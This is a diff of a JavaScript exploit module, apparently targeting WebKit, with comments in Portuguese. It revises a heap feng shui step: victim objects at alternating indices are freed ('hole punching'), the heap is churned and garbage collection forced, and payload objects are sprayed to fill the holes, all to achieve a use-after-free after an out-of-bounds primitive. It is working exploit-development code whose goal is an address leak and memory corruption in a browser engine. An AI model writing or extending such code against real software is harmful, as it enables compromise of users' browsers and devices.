@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v11 - Correção de RangeError no Heap Churning)
+// js/script3/testArrayBufferVictimCrash.mjs (v12 - Heap Feng Shui com "Hole Punching")
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. Corrigido o RangeError que ocorria na etapa de "agitação do heap" (churning),
-//    garantindo que o comprimento do array seja sempre um inteiro.
-// 2. Com esta correção, a verificação do UAF por propriedade deve ser concluída.
+// 1. A FASE 5 agora implementa uma técnica de Heap Feng Shui mais robusta.
+// 2. Em vez de liberar todas as vítimas, liberamos objetos alternados ("hole punching")
+//    para criar um layout de memória mais previsível e aumentar a chance de sucesso do UAF.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -40,50 +40,52 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await triggerOOB_primitive({ force_reinit: true });
         logS3("Primitiva OOB operacional.", "good");
 
-        // FASE 5: TENTATIVA DE CORRUPÇÃO CONTROLADA E VERIFICAÇÃO POR PROPRIEDADE
-        logS3("--- FASE 5: Tentativa de Corrupção Controlada e Verificação por Propriedade ---", "subtest");
+        // FASE 5: TENTATIVA DE CORRUPÇÃO CONTROLADA COM "HOLE PUNCHING"
+        logS3("--- FASE 5: Tentativa de Corrupção Controlada com 'Hole Punching' ---", "subtest");
         
         const VICTIM_MARKER = 0xCCCCCCCC;
         const PAYLOAD_MARKER = 0x41414141;
         const NUM_OBJECTS = 2000;
 
-        // 1. Alocar vítimas como objetos com uma propriedade "marker"
+        // 1. Alocar vítimas
         logS3(`Alocando ${NUM_OBJECTS} vítimas...`, 'info');
         let victims = [];
         for (let i = 0; i < NUM_OBJECTS; i++) {
             victims.push({ marker: VICTIM_MARKER });
         }
         
-        // Escolher uma vítima "canário" para observar
-        const canary_victim_obj = victims[Math.floor(NUM_OBJECTS / 2)];
-        logS3(`Vítima "canário" selecionada. Verificando seu marcador...`, 'info');
+        // Escolher uma vítima "canário" (de um índice PAR) para observar
+        const canary_index = 1000; // Deve ser um número par
+        const canary_victim_obj = victims[canary_index];
+        logS3(`Vítima "canário" selecionada (índice ${canary_index}). Verificando seu marcador...`, 'info');
         
         if (canary_victim_obj.marker !== VICTIM_MARKER) {
             throw new Error("Falha na configuração: marcador da vítima 'canário' está incorreto ANTES do UAF.");
         }
         logS3("Marcador da vítima ANTES do UAF está correto (0xCCCCCCCC).", "good");
 
-        // 2. Liberar TODAS as vítimas para criar "buracos" no heap
-        logS3(`Liberando ${NUM_OBJECTS} vítimas para acionar o UAF...`, "warn");
-        victims = [];
+        // 2. Liberar vítimas em índices PARES para "perfurar buracos" no heap
+        logS3(`Liberando vítimas alternadas para criar 'buracos' no heap...`, "warn");
+        for (let i = 0; i < NUM_OBJECTS; i += 2) {
+            victims[i] = null;
+        }
 
         // 3. Forçar Garbage Collection e Agitar o Heap
         logS3("Forçando GC e agitando o heap para aumentar a confiabilidade...", "debug");
         let pressure = [];
-        for (let i = 0; i < 20; i++) { pressure.push(new ArrayBuffer(1024 * 1024)); }
+        for (let i = 0; i < 5; i++) { pressure.push(new Array(1024*1024)); } // Menos pressão, mais agitação
         pressure = [];
         let churn = [];
-        for (let i = 0; i < 1000; i++) {
-            // --- CORREÇÃO (v11): Usar Math.floor para garantir um comprimento de array inteiro. ---
-            churn.push(new Array(Math.floor(Math.random() * 100)));
+        for (let i = 0; i < 2000; i++) {
+            churn.push(new Array(Math.floor(Math.random() * 200)));
         }
         churn = [];
         await PAUSE_S3(200);
 
-        // 4. Alocar payloads (também como objetos) para preencher os buracos
-        logS3(`Alocando ${NUM_OBJECTS} payloads...`, "info");
+        // 4. Alocar payloads para preencher os buracos (metade do número de vítimas)
+        logS3(`Alocando ${NUM_OBJECTS / 2} payloads para preencher os buracos...`, "info");
         let payloads = [];
-        for (let i = 0; i < NUM_OBJECTS; i++) {
+        for (let i = 0; i < NUM_OBJECTS / 2; i++) {
             payloads.push({ marker: PAYLOAD_MARKER });
         }
         
